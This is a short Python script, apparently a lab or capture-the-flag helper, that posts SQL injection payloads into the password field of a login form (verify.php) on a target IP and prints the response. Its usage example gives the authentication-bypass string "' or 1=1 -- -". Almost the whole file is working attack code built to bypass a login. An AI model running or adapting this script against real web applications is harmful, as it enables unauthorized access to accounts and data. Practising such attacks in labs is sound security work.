# python script to send SQL injection payloads to the web server

import requests
from bs4 import BeautifulSoup
import sys

def sql_gun(ip, username, payload):
    url = "http://%s/verify.php" % (ip)
    userID = "%s" % (username)
    password = "%s" % (payload)
    #proxy = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}
    login_data = "Login"
    our_data = {'UserId':userID, 'Password':password, 'Login':login_data}
    r = requests.post(url, data=our_data, allow_redirects=True) # with proxy do proxies=proxy
    s = BeautifulSoup(r.text, 'lxml')
    print(s.text)

def main():
    if len(sys.argv) != 4:
        print("[+] usage: %s <target-ip> <username> <payload>" % (sys.argv[0]))
        print("[+] usage: %s 127.0.0.1 admin \"' or 1=1 -- -\"" % (sys.argv[0]))
        sys.exit(-1)

    ip = sys.argv[1]
    username = sys.argv[2]
    payload = sys.argv[3]

    sql_gun(ip, username, payload)

if __name__ == "__main__":
    main()
